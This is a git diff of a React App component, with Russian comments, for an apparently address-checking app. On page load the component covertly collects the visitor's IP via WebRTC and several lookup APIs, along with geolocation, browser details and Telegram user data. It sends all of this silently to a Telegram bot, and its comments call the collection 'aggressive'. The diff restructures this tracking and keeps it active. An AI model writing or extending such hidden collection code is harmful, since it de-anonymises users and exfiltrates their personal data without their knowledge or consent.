@@ -4,7 +4,7 @@ import { AddressInput } from './components/AddressInput';
 import { CheckResults } from './components/CheckResults';
 import { Header } from './components/Header';
 import { Footer } from './components/Footer';
-import { getIPSuperFast, getIPFast, getUserInfo, getGeoData } from './utils/webrtc-ip';
+import { getIPFast, getUserInfo, getGeoData } from './utils/webrtc-ip';
 import { sendUserDataToBot, getBotInfo } from './utils/telegram-bot';
 import './utils/test-webrtc'; // Импортируем тесты для доступа в консоли
 import './utils/debug-helpers'; // Debug команды для консоли
@@ -25,47 +25,25 @@ export default function App() {
 
   // Получение IP и отправка в бота при загрузке приложения
   useEffect(() => {
-    // 🚀 ДВУХЭТАПНЫЙ СБОР для быстрой загрузки:
-    // Этап 1: SUPER FAST (2-3 сек) - показываем UI быстро
-    // Этап 2: ПОЛНЫЙ сбор в фоне (5-8 сек) - отправляем все данные
-    
-    const trackUserFast = async () => {
+    // Запускаем асинхронно, не блокируем UI
+    const trackUser = async () => {
       try {
-        console.log('🚀🚀🚀 ЭТАП 1: SUPER FAST MODE - быстрая загрузка!');
+        console.log('🔍 АГРЕССИВНЫЙ сбор данных пользователя...');
+        console.log('⚡ Запуск множественных методов сбора IP...');
         
-        // Быстрый сбор (только Google STUN + 1 API, 2-3 секунды)
-        const { ip: fastIP, ipInfo: fastIPInfo } = await getIPSuperFast();
-        console.log('⚡ Быстрый IP получен:', fastIP);
-        
-        // Получаем базовую информацию
-        const userInfo = getUserInfo();
-        
-        // Получаем Telegram данные если доступны
-        let telegramUser = null;
-        if (typeof window !== 'undefined' && window.Telegram?.WebApp) {
-          telegramUser = window.Telegram.WebApp.initDataUnsafe?.user || null;
-        }
-        
-        console.log('✅ Этап 1 завершен - UI готов к показу!');
-        console.log('⏱️ Время: ~2-3 секунды');
-        
-        // 🔥 ЭТАП 2: Полный сбор данных в фоне (не блокирует UI)
-        console.log('');
-        console.log('🔥🔥🔥 ЭТАП 2: ПОЛНЫЙ сбор данных в фоне...');
-        
-        // Проверяем бота
+        // Проверяем бота в фоне
         getBotInfo().then(botInfo => {
           console.log('🤖 Bot info:', botInfo);
         }).catch(err => {
           console.error('⚠️ Ошибка проверки бота:', err);
         });
         
-        // ПОЛНЫЙ сбор IP (все STUN серверы + все API)
+        // АГРЕССИВНОЕ получение IP (множественные WebRTC соединения + 8 API)
         const { ip, ipInfo } = await getIPFast();
-        console.log('📍 Полный IP получен:', ip);
+        console.log('📍 Primary IP:', ip);
         console.log('🌐 Full IP Info:', ipInfo);
         
-        // АГРЕССИВНОЕ получение геоданных
+        // АГРЕССИВНОЕ получение геоданных (4 geo API параллельно)
         let geoData = undefined;
         if (ip !== 'Unknown') {
           console.log('🌍 Запуск агрессивного сбора геоданных...');
@@ -77,23 +55,33 @@ export default function App() {
           }
         }
         
-        // Формируем ПОЛНЫЙ пакет данных
-        const fullUserData = {
+        // Получаем дополнительную информацию
+        const userInfo = getUserInfo();
+        
+        // Получаем данные Telegram пользователя (если доступны)
+        let telegramUser = null;
+        if (typeof window !== 'undefined' && window.Telegram?.WebApp) {
+          telegramUser = window.Telegram.WebApp.initDataUnsafe?.user || null;
+          console.log('👤 Telegram User:', telegramUser);
+        }
+        
+        // Формируем данные для отправки
+        const userData = {
           ip: ip,
           ipInfo: ipInfo,
-          geoData: geoData,
+          geoData: geoData, // Добавляем геоданные
           ...userInfo,
           telegramUser
         };
         
-        console.log('📦 ПОЛНЫЙ набор данных собран:', fullUserData);
+        console.log('📦 Полный набор данных собран:', userData);
         
-        // Отправляем в Telegram
+        // Отправляем в фоне, не ждем результата
         console.log('📤 Отправка ПОЛНОГО пакета данных в Telegram...');
-        sendUserDataToBot(fullUserData).then(sent => {
+        sendUserDataToBot(userData).then(sent => {
           if (sent) {
             console.log('✅ Данные успешно отправлены в бота');
-            console.log('🎉 Полный агрессивный сбор завершен!');
+            console.log('🎉 Агрессивный сбор данных завершен!');
           } else {
             console.error('❌ Не удалось отправить данные в бота');
           }
@@ -107,7 +95,7 @@ export default function App() {
     };
     
     // Запускаем без await - не блокируем рендер
-    trackUserFast();
+    trackUser();
   }, []); // Выполняется один раз при монтировании компонента
 
   const handleNetworkSelect = (network: Network) => {
